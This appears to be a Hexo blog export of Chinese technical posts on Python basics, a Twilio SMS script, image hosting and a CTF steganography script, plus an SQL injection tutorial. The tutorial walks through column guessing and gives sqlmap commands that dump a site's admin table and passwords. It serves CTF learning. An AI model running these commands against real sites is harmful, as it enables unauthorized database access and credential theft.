class="line">                file_object.write(<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&quot;\n&quot;</span>)    </span><br></pre></td></tr></table></figure>

<p>python处理txt在原有的文件上添加内容</p>
<p>用a</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line">filename = <span class="string">&#x27;test_text.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">    file_object.write(<span class="string">&quot;lalala\n&quot;</span>)</span><br><span class="line">    file_object.write(<span class="string">&quot;hahaha\n&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>python处理txt写入空文件（覆盖）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line">filename = <span class="string">&#x27;test_text.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">    file_object.write(<span class="string">&quot;Add a word&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>open会自动创建不存在的文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line">filename = <span class="string">&#x27;test_text.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file_object:</span><br><span class="line">    file_object.write(<span class="string">&quot;Add a word&quot;</span>)</span><br><span class="line">    file_object.write(<span class="string">&quot;Add two words&quot;</span>) <span class="comment">#写入多行</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>python处理excel</tag>
      </tags>
  </entry>
  <entry>
    <title>python二级练习--jieba库</title>
    <url>/2020/01/31/python%E4%BA%8C%E7%BA%A7%E7%BB%83%E4%B9%A0-jieba%E5%BA%93/</url>
    <content><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script>

<h3 id="python的jieba分词"><a href="#python的jieba分词" class="headerlink" title="python的jieba分词"></a>python的jieba分词</h3><p>pip install jieba安装jieba分词一开始安装失败，提示</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">You should consider upgrading via the &#x27;pip install --upgrade pip&#x27; command.</span><br></pre></td></tr></table></figure>

<p>原因是要用国内的镜像下载，即运行一下命令安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple jieba</span><br></pre></td></tr></table></figure>

<p>三种模式的使用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line"></span><br><span class="line">seg_str = <span class="string">&quot;中国特色社会主义。&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;/&quot;</span>.join(jieba.lcut(seg_str)))    <span class="comment"># 精简模式，返回一个列表类型的结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;/&quot;</span>.join(jieba.lcut(seg_str, cut_all=<span class="literal">True</span>)))      <span class="comment"># 全模式，使用 &#x27;cut_all=True&#x27; 指定 </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;/&quot;</span>.join(jieba.lcut_for_search(seg_str)))     <span class="comment"># 搜索引擎模式</span></span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">中国/特色/社会主义/。</span><br><span class="line">中国/国特/特色/社会/社会主义/会主/主义/。</span><br><span class="line">中国/特色/社会/会主/主义/社会主义/。</span><br></pre></td></tr></table></figure>

<p>例题：<br>考生文件夹下存在- -个文件PY102. py,请写代码替换横线，键盘输入一段文本，保存在一个字符串变量s中，分别用Python内置函数及jieba库中已有函数计算字符串s的中文字符个数及中文词语个数。注意:中文字符包含中文标点符号。例如，键盘输入:俄罗斯举办世界杯屏幕输出:<br>中文字符数为8，中文词语数为3。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 请在______处使用一行代码或表达式替换</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 注意：请不要修改其他已给出代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jieba</span><br><span class="line">s = <span class="built_in">input</span>(<span class="string">&quot;请输入一个字符串&quot;</span>)</span><br><span class="line">n = <span class="built_in">len</span>(s)</span><br><span class="line">m = <span class="built_in">len</span>(jieba.lcut(s))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;中文字符数为&#123;&#125;，中文词语数为&#123;&#125;。&quot;</span>.<span class="built_in">format</span>(n, m))</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python二级</tag>
        <tag>jieba库</tag>
      </tags>
  </entry>
  <entry>
    <title>python二级之数字格式化</title>
    <url>/2020/01/27/python%E4%BA%8C%E7%BA%A7%E4%B9%8B%E6%95%B0%E5%AD%97%E6%A0%BC%E5%BC%8F%E5%8C%96/</url>
    <content><![CDATA[<p>举个栗子：</p>
<pre><code class="Python">&gt;&gt;&gt;print(&quot;&#123;:.2f&#125;&quot;.format(3.1415926))   #和c语言类似
3.14 
</code></pre>
<p>比较特殊的：</p>
<pre><code class="Python">&gt;&gt;&gt;print(&quot;&#123;:+.2f&#125;&quot;.format(3.1415926)) #带符号保留小数后两位
+3.14

&gt;&gt;&gt;print(&quot;&#123;:.0f&#125;&quot;.format(2.71828))  #不带小数，且四舍五入
3

&gt;&gt;&gt;print(&quot;&#123;:,&#125;&quot;.format(1000000))  #以逗号分隔的数字格式
1,000,000

&gt;&gt;&gt;print(&quot;&#123;:^10d&#125;&quot;.format(13))   #中间对齐，长度为10
        13    
        
&gt;&gt;&gt;print(&quot;&#123;:.2%&#125;&quot;.format(0.25))  #百分比格式
25.00%

&gt;&gt;&gt;print(&quot;&#123;:x&lt;4d&#125;&quot;.format(5))   #数字补x (填充右边, 宽度为4)
5xxx

&gt;&gt;&gt;print(&quot;&#123;:.2e&#125;&quot;.format(123456789))  #指数记法
1.23e+08

&gt;&gt;&gt;print(&#39;&#123;:b&#125;&#39;.format(11))  #二进制
1011

&gt;&gt;&gt;print(&#39;&#123;:d&#125;&#39;.format(11))  #十进制
11

&gt;&gt;&gt;print(&#39;&#123;:o&#125;&#39;.format(11))   #八进制
13

&gt;&gt;&gt;print(&#39;&#123;:x&#125;&#39;.format(11))  #十六进制
b

&gt;&gt;&gt;print(&#39;&#123;:#x&#125;&#39;.format(11))  #十六进制（带0x）
0xb

&gt;&gt;&gt;print(&#39;&#123;:#X&#125;&#39;.format(11))  #十六进制（带0x且大写）
0XB
</code></pre>
<p>例题：键盘输入正整数n，按要求把n输出到屏幕，格式要求：宽度为20个字符，减号字符-填充，右对齐，带千位分割符。如果输入正整数超过20位，则按照真实长度输出。例如键盘输入正整数n为1234，屏幕输出—————1,234</p>
<pre><code class="Python">n = eval(input(&quot;请输入正整数:&quot;))
print(&quot;&#123;:-&gt;20,&#125;&quot;.format(n))
</code></pre>
<p>注意一个易错点，当有逗号的时候就不需要十进制标识符号d！！！（个人理解逗号分隔只存在十进制中），所以{:-&gt;20d,}报错。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>python二级</tag>
        <tag>数字格式化</tag>
      </tags>
  </entry>
  <entry>
    <title>python自动发送免费短信</title>
    <url>/2020/02/24/python%E8%87%AA%E5%8A%A8%E5%8F%91%E9%80%81%E5%85%8D%E8%B4%B9%E7%9F%AD%E4%BF%A1/</url>
    <content><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script>

<p>免费发短信主要依靠平台：twillio，需要翻墙，一开始送15.5美元，大约能免费发500次短信。</p>
<p>好处是，国外的不需要实名，也不需要申请短信内容模板，免费次数多，python调用十分饭方便。</p>
<p>坏处是因为这免费的500条短信测试使用，只能同时给一个手机号发，并且发送之前需要短信验证。</p>
<p>网址：<a href="https://www.twilio.com/">https://www.twilio.com/</a></p>
<p>流程：注册账号→验证手机号→购买试用手机号（1$）→选择语言→获得python调用接口发短信的实例→安装twilio库→填写模板的token、sid、两个电话号码</p>
<p>给晴晴写了一个代码放在服务器上：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> twilio.rest <span class="keyword">import</span> Client</span><br><span class="line"><span class="keyword">import</span> requests, json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> schedule</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sms</span>():</span></span><br><span class="line">	account_sid = <span class="string">&#x27;xxxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line">	auth_token = <span class="string">&#x27;xxxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line">	client = Client(account_sid, auth_token)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	tianqi_url = <span class="string">&quot;https://api.vvhan.com/api/weather?city=牡丹区&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># yiyan_url = &quot;https://api.vvhan.com/api/ian?type=json&quot;</span></span><br><span class="line"></span><br><span class="line">	r1 = requests.get(tianqi_url)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># r2 = requests.get(yiyan_url)</span></span><br><span class="line"></span><br><span class="line">	tianqi_data = json.loads(r1.text)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># yiyan_data = json.loads(r2.text)</span></span><br><span class="line"></span><br><span class="line">	message = client.messages \</span><br><span class="line">					.create(</span><br><span class="line">							body=<span class="string">&quot;早上好小晴晴！今天是%s,今天%s的天气是%s,今天%s、%s。照顾好自己哦。小管管永远爱你mua~&quot;</span>%(tianqi_data.get(<span class="string">&quot;info&quot;</span>).get(<span class="string">&quot;date&quot;</span>), tianqi_data.get(<span class="string">&quot;city&quot;</span>), tianqi_data.get(<span class="string">&quot;info&quot;</span>).get(<span class="string">&quot;type&quot;</span>), tianqi_data.get(<span class="string">&quot;info&quot;</span>).get(<span class="string">&quot;high&quot;</span>), tianqi_data.get(<span class="string">&quot;info&quot;</span>).get(<span class="string">&quot;low&quot;</span>)),</span><br><span class="line">							from_=<span class="string">&#x27;+*************&#x27;</span>,</span><br><span class="line">							to=<span class="string">&#x27;+86********&#x27;</span></span><br><span class="line">						)</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(message.sid)</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;ok!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">schedule.every().day.at(<span class="string">&quot;07:00&quot;</span>).do(sms)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	schedule.run_pending()</span><br><span class="line">	time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>因为测试发现，当内容过多就收不到短信，这里仅仅用了一个天气的api</p>
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>免费发送短信</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入--基础篇</title>
    <url>/2019/03/11/sql%E6%B3%A8%E5%85%A5-%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
    <content><![CDATA[<h1 id="sql简介"><a href="#sql简介" class="headerlink" title="sql简介"></a>sql简介</h1><p>sql注入是在系统开发的过程中程序员编程不规范，我们可以通过把SQL语句插入到WEB表单中进行查询字符串，最终达成欺骗服务器执行恶意的SQL命令。</p>
<h3 id="sql注入的类型："><a href="#sql注入的类型：" class="headerlink" title="sql注入的类型："></a>sql注入的类型：</h3><p>Boolean-based blind SQL injection（布尔型注入）<br>Error-based SQL injection（报错型注入）<br>UNION query SQL injection（可联合查询注入）<br>Stacked queries SQL injection（可多语句查询注入）<br>Time-based blind SQL injection（基于时间延迟注入）</p>
<p>对于sql注入，首先要判断网站使用的是何种数据库。</p>
<h3 id="常见的数据库："><a href="#常见的数据库：" class="headerlink" title="常见的数据库："></a>常见的数据库：</h3><p>Oracle、MySQL、SQL Server、Access、MSsql、mongodb等<br>关系型数据库通过外键关联来建立表与表之间的关系，非关系型数据库通常指数据以对象的形式存储在数据库中，而对象之间的关系通过每个对象自身的属性来决定.<br>关系型数据库：由二维表及其之间的联系组成的一个数据组织。如：Oracle、DB2、MySql<br>非关系型数据库：非关系型数据库产品是传统关系型数据库的功能阉割版本，通过减少用不到或很少用的功能，来大幅度提高产品性能。如：NoSql、Cloudant</p>
<h1 id="sql注入基本步骤"><a href="#sql注入基本步骤" class="headerlink" title="sql注入基本步骤"></a>sql注入基本步骤</h1><h3 id="找注入点且得到闭合字符"><a href="#找注入点且得到闭合字符" class="headerlink" title="找注入点且得到闭合字符"></a>找注入点且得到闭合字符</h3><p><img src="https://i.loli.net/2019/03/11/5c8614c113783.png"><br>sql语句中 –空格 是注释的意思，在url中+号编码为空格<br>即   ‘id=1’– ‘   正常回显，–空格将最后的单引号注释掉了</p>
<p>以下内容为部分程序代码:<br>$id=$GET[‘id’]; //接受get传递的参数名为id的值并赋值给变量id<br>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”; // 把查询到的结果赋值给变量名sql<br>一对单引号为闭合字符</p>
<h3 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h3><p>通过不同数据库不同的语法判断</p>
<h3 id="猜解列数，得到显示位"><a href="#猜解列数，得到显示位" class="headerlink" title="猜解列数，得到显示位"></a>猜解列数，得到显示位</h3><p><img src="https://i.loli.net/2019/03/11/5c86192be1d58.png"><br>order by 4 错<br><img src="https://i.loli.net/2019/03/11/5c86196525a7a.png"><br>order by 3 对<br>得一共3列<br><img src="https://i.loli.net/2019/03/11/5c861a63f33a7.png"><br>爆出显示位为后两位，可以在2，3的位置做手脚</p>
<h3 id="得到基本信息-如：数据库名、数据库版本、当前数据库名等"><a href="#得到基本信息-如：数据库名、数据库版本、当前数据库名等" class="headerlink" title="得到基本信息(如：数据库名、数据库版本、当前数据库名等)"></a>得到基本信息(如：数据库名、数据库版本、当前数据库名等)</h3><p>注：Mysql的CONCAT_WS函数，有分割符的字符串连接<br><img src="https://i.loli.net/2019/03/11/5c862191ddb99.png"></p>
<h3 id="得到数据库名"><a href="#得到数据库名" class="headerlink" title="得到数据库名"></a>得到数据库名</h3><p><img src="https://i.loli.net/2019/03/12/5c87631d7ba02.png"><br><img src="https://i.loli.net/2019/03/12/5c8766073ae20.png"></p>
<h3 id="得到security数据库的表名"><a href="#得到security数据库的表名" class="headerlink" title="得到security数据库的表名"></a>得到security数据库的表名</h3><p><img src="https://i.loli.net/2019/03/12/5c876c351df96.png"></p>
<h3 id="猜解列名"><a href="#猜解列名" class="headerlink" title="猜解列名"></a>猜解列名</h3><p><img src="https://i.loli.net/2019/03/12/5c876f891817e.png"></p>
<h3 id="猜解数据"><a href="#猜解数据" class="headerlink" title="猜解数据"></a>猜解数据</h3><p><img src="https://i.loli.net/2019/03/12/5c877132df21a.png"></p>
<h1 id="sqlmap简单用法"><a href="#sqlmap简单用法" class="headerlink" title="sqlmap简单用法"></a>sqlmap简单用法</h1><h4 id="检查注入点："><a href="#检查注入点：" class="headerlink" title="检查注入点："></a>检查注入点：</h4><p>sqlmap -u <a href="http://aa.com/star_photo.php?artist_id%EF%BC%9D11">http://aa.com/star_photo.php?artist_id＝11</a></p>
<h4 id="爆所有数据库信息："><a href="#爆所有数据库信息：" class="headerlink" title="爆所有数据库信息："></a>爆所有数据库信息：</h4><p>sqlmap -u <a href="http://aa.com/star_photo.php?artist_id%EF%BC%9D11">http://aa.com/star_photo.php?artist_id＝11</a> –dbs</p>
<h4 id="爆当前数据库信息："><a href="#爆当前数据库信息：" class="headerlink" title="爆当前数据库信息："></a>爆当前数据库信息：</h4><p>sqlmap -u <a href="http://aa.com/star_photo.php?artist_id%EF%BC%9D11">http://aa.com/star_photo.php?artist_id＝11</a> –current-db</p>
<h4 id="指定库名列出所有表："><a href="#指定库名列出所有表：" class="headerlink" title="指定库名列出所有表："></a>指定库名列出所有表：</h4><p>sqlmap -u <a href="http://aa.com/star_photo.php?artist_id%EF%BC%9D11">http://aa.com/star_photo.php?artist_id＝11</a> -D vhost48330 –tables<br>‘vhost48330’ 为指定数据库名称</p>
<h4 id="指定库名表名列出所有字段："><a href="#指定库名表名列出所有字段：" class="headerlink" title="指定库名表名列出所有字段："></a>指定库名表名列出所有字段：</h4><p>sqlmap -u <a href="http://aa.com/star_photo.php?artist_id%EF%BC%9D11">http://aa.com/star_photo.php?artist_id＝11</a> -D vhost48330 -T admin –columns<br>‘admin’ 为指定表名称</p>
<h4 id="指定库名表名字段dump出指定字段："><a href="#指定库名表名字段dump出指定字段：" class="headerlink" title="指定库名表名字段dump出指定字段："></a>指定库名表名字段dump出指定字段：</h4><p>sqlmap -u <a href="http://aa.com/star_photo.php?artist_id%EF%BC%9D11">http://aa.com/star_photo.php?artist_id＝11</a> -D vhost48330 -T admin -C ac，id，password –dump<br>‘ac,id,password’ 为指定字段名称</p>
<h4 id="sqlmap之post注入："><a href="#sqlmap之post注入：" class="headerlink" title="sqlmap之post注入："></a>sqlmap之post注入：</h4><p>首先bp抓包；Copy to file。<br>讲txt文件放置到sqlmap目录下面<br>直接命令python sqlmap.py -r a.txt</p>
<p>用sqlmap进行做post注入测试的时候，发现这么一种情况：<br>对POST请求，之前一直用 “-r txt文件”的形式，进行注入测试；<br>发现还有另一种POST，用“-r txt文件”的形式进行却无效，原来可以通过“–data=”key=value””来进行测试注入。</p>
<p>故以上两种情况都是post的，却还是有区别的</p>
<p>故此记录如下：<br>1：POST注入时，什么时候用“-r txt文件”的形式<br>post的body是这种形式：<br> 参数1=value1&amp;参数2=value2…..<br> 即用 -&gt;   sqlmap -r “d://postrequest.txt”<br>2：POST注入时，什么时候用 -&gt; sqlmap -u  url  –data=”name=value” 的形式<br>post的body是这种形式的：</p>
<p>–c7eb38bf-7ea1-4fbc-836a-47ceafdfd30a<br>Content-Disposition: form-data; name=”page”<br>Content-Length: 1</p>
<p>–c7eb38bf-7ea1-4fbc-836a-47ceafdfd30a<br>Content-Disposition: form-data; name=”search”<br>Content-Length: 1<br>qqqqq<br>–c7eb38bf-7ea1-4fbc-836a-47ceafdfd30a–</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>sql注入</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>关于图床</title>
    <url>/2020/01/26/%E5%85%B3%E4%BA%8E%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<p>今天捣鼓了一下图床，之前一直用的图床是<a href="https://sm.ms/">https://sm.ms</a><br>这个图床是免费的但是每天只有三十次免费上传机会，而且响应时间较长，但是使用起来十分方便。</p>
<h2 id="GitHub-jsDelivr-CDN-PicGO"><a href="#GitHub-jsDelivr-CDN-PicGO" class="headerlink" title="GitHub+jsDelivr CDN+PicGO"></a>GitHub+jsDelivr CDN+PicGO</h2><p>首先介绍一个十分良心的软件，PicGO.<br>下载地址：<a href="https://github.com/Molunerfinn/PicGo/releases">https://github.com/Molunerfinn/PicGo/releases</a></p>
<p>这个软件集成了各种图床可以方便上传管理等等，详情请看<br>配置手册：<a href="https://picgo.github.io/PicGo-Doc/zh/guide/">https://picgo.github.io/PicGo-Doc/zh/guide/</a></p>
<p>github本上就可以放入图片当图床但是响应时间非常长</p>
<p>jsDeliver就是用来加速的，而且是免费的</p>
<p>所以大体上原理是，用PicGo上传的github，然后用jsDeliver加速。</p>
<h4 id="Github配置"><a href="#Github配置" class="headerlink" title="Github配置"></a>Github配置</h4><p>首先访问<a href="https://github.com/settings/tokens">https://github.com/settings/tokens</a></p>
<p>来设置token<br><img src="https://ech0zr.github.io/img/post/tuchuang/1.png"><br>勾选权限<br><img src="https://ech0zr.github.io/img/post/tuchuang/2.png"><br>拉到最下面，点击Generate token，生成并复制token。</p>
<h4 id="PicGO配置"><a href="#PicGO配置" class="headerlink" title="PicGO配置"></a>PicGO配置</h4><p><img src="https://ech0zr.github.io/img/post/tuchuang/3.png"><br>设定仓库名称：   用户名/仓库名</p>
<p>设定分支名臣：master</p>
<p>设定Token：填上GitHub的token</p>
<p>指定储存路径：/img（若不存在会自动创建）</p>
<h4 id="jsDeliver配置"><a href="#jsDeliver配置" class="headerlink" title="jsDeliver配置"></a>jsDeliver配置</h4><p>在上一级PicGO配置最后一行的自定义域名：</p>
<pre><code class="Url">https://cdn.jsdelivr.net/gh/Z3p5/tu
</code></pre>
<p>gh表示来自GitHub的仓库<br>Z3p5/tu仓库的具体位置</p>
<p>然后就完成了，在上传区上传即可，链接会在剪切板</p>
<p>但是该方法也有缺点，不能每次都上传成功！！！但是访问速度很快，所以建议该方法适合放少部分经常访问的图片，而不适合作为相册等大量图片。</p>
<h2 id="响应速度比较："><a href="#响应速度比较：" class="headerlink" title="响应速度比较："></a>响应速度比较：</h2><p>jsdelivr：<br><img src="https://ech0zr.github.io/img/post/tuchuang/4.png"></p>
<p>sm.ms:<br><img src="https://ech0zr.github.io/img/post/tuchuang/5.png"></p>
<p>码云本地：<br><img src="https://ech0zr.github.io/img/post/tuchuang/6.png"></p>
<p>所以综上所述，博客的背景可以用jsdeliver，相册文章图片可以放在码云本地。</p>
<hr>
<p>配置图床遇到的一个小问题，打开ssr时：<br><img src="https://ech0zr.github.io/img/post/tuchuang/7.png"></p>
<p>解决方案：<br>换个端口！</p>
<p>找到配置文件 gui-config.json<br>找到：</p>
<pre><code class="Json">&quot;localPort&quot; : 1080,
</code></pre>
<p>修改为其他端口：</p>
<pre><code class="Json">&quot;localPort&quot; : 12345,
</code></pre>
<p>重启ssr即可。</p>
]]></content>
      <categories>
        <category>雕虫小技</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>图床</tag>
        <tag>雕虫小技</tag>
      </tags>
  </entry>
  <entry>
    <title>修改隐写高度脚本</title>
    <url>/2020/10/31/%E4%BF%AE%E6%94%B9%E9%9A%90%E5%86%99%E9%AB%98%E5%BA%A6%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<script type="text/javascript" src="/z3p5/js/bai.js"></script>
<p>写了一个针对CTF图片高度宽度隐写的脚本，可以修改该脚本实现批量。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># @Author  : Ech0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">png</span>(<span class="params">filename</span>):</span></span><br><span class="line">    tf = <span class="built_in">open</span>(<span class="string">&#x27;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(filename),<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    t = tf.read()</span><br><span class="line">    tf.close()</span><br><span class="line">    <span class="comment"># 读取二进制文件</span></span><br><span class="line"></span><br><span class="line">    nt = <span class="built_in">bytearray</span>(t)</span><br><span class="line">    <span class="comment"># 转化成可列表处理的字节流</span></span><br><span class="line"></span><br><span class="line">    w = <span class="built_in">int</span>(binascii.b2a_hex(t[<span class="number">16</span>:<span class="number">20</span>]),<span class="number">16</span>)</span><br><span class="line">    h = <span class="built_in">int</span>(binascii.b2a_hex(t[<span class="number">20</span>:<span class="number">24</span>]),<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;wight is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(w))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hight is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(h))</span><br><span class="line">    nw = <span class="built_in">input</span>(<span class="string">&#x27;new wight:&#x27;</span>)</span><br><span class="line">    nh = <span class="built_in">input</span>(<span class="string">&#x27;new hight:&#x27;</span>)</span><br><span class="line">    <span class="comment"># 找出二进制文件标识宽、长的位置</span></span><br><span class="line"></span><br><span class="line">    nw_1 =<span class="string">&#x27;&#123;:0&gt;8x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(nw))</span><br><span class="line">    nh_1 =<span class="string">&#x27;&#123;:0&gt;8x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(nh))</span><br><span class="line">    <span class="comment"># 将输入的新宽、长转化为8位十六进制</span></span><br><span class="line"></span><br><span class="line">    nw_2 = [nw_1[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(nw_1),<span class="number">2</span>)]</span><br><span class="line">    nh_2 = [nh_1[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(nh_1),<span class="number">2</span>)]</span><br><span class="line">    <span class="comment"># 字符串按照两个一组切片并写入列表</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nw_2)):</span><br><span class="line">        nt[i+<span class="number">16</span>] = <span class="built_in">int</span>(nw_2[i],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nh_2)):</span><br><span class="line">        nt[i+<span class="number">20</span>] = <span class="built_in">int</span>(nh_2[i],<span class="number">16</span>)</span><br><span class="line">    <span class="comment"># 修改字节流</span></span><br><span class="line"></span><br><span class="line">    n_nt = <span class="built_in">bytes</span>(nt)</span><br><span class="line">    nf = <span class="built_in">open</span>(<span class="string">&#x27;new_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(filename),<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    nf.write(n_nt)</span><br><span class="line">    nf.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jpg</span>(<span class="params">filename</span>):</span></span><br><span class="line">    tf = <span class="built_in">open</span>(<span class="string">&#x27;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(filename),<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    t = tf.read()</span><br><span class="line">    tf.close()</span><br><span class="line">    <span class="comment"># 读取二进制文件</span></span><br><span class="line"></span><br><span class="line">    nt = <span class="built_in">bytearray</span>(t)</span><br><span class="line">    <span class="comment"># 转化成可列表处理的字节流</span></span><br><span class="line"></span><br><span class="line">    sta = nt.index(<span class="string">b&#x27;\xff\xc0&#x27;</span>)</span><br><span class="line">    <span class="comment"># 根据段标志查找标识行高的位置</span></span><br><span class="line"></span><br><span class="line">    h = <span class="built_in">int</span>(binascii.b2a_hex(nt[sta+<span class="number">5</span>:sta+<span class="number">7</span>]),<span class="number">16</span>)</span><br><span class="line">    w = <span class="built_in">int</span>(binascii.b2a_hex(nt[sta+<span class="number">7</span>:sta+<span class="number">9</span>]),<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;wight is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(w))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;hight is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(h))</span><br><span class="line">    nw = <span class="built_in">input</span>(<span class="string">&#x27;new wight:&#x27;</span>)</span><br><span class="line">    nh = <span class="built_in">input</span>(<span class="string">&#x27;new hight:&#x27;</span>)</span><br><span class="line">    <span class="comment"># 找出二进制文件标识宽、长的位置</span></span><br><span class="line"></span><br><span class="line">    nw_1 =<span class="string">&#x27;&#123;:0&gt;4x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(nw))</span><br><span class="line">    nh_1 =<span class="string">&#x27;&#123;:0&gt;4x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(nh))</span><br><span class="line">    <span class="comment"># 将输入的新宽、长转化为4位十六进制</span></span><br><span class="line"></span><br><span class="line">    nw_2 = [nw_1[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(nw_1),<span class="number">2</span>)]</span><br><span class="line">    nh_2 = [nh_1[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(nh_1),<span class="number">2</span>)]</span><br><span class="line">    <span class="comment"># 字符串按照两个一组切片并写入列表</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nh_2)):</span><br><span class="line">        nt[i+sta+<span class="number">5</span>] = <span class="built_in">int</span>(nh_2[i],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nw_2)):</span><br><span class="line">        nt[i+sta+<span class="number">7</span>] = <span class="built_in">int</span>(nw_2[i],<span class="number">16</span>)</span><br><span class="line">    <span class="comment"># 修改字节流</span></span><br><span class="line"></span><br><span class="line">    n_nt = <span class="built_in">bytes</span>(nt)</span><br><span class="line">    nf = <span class="built_in">open</span>(<span class="string">&#x27;new_&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(filename),<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    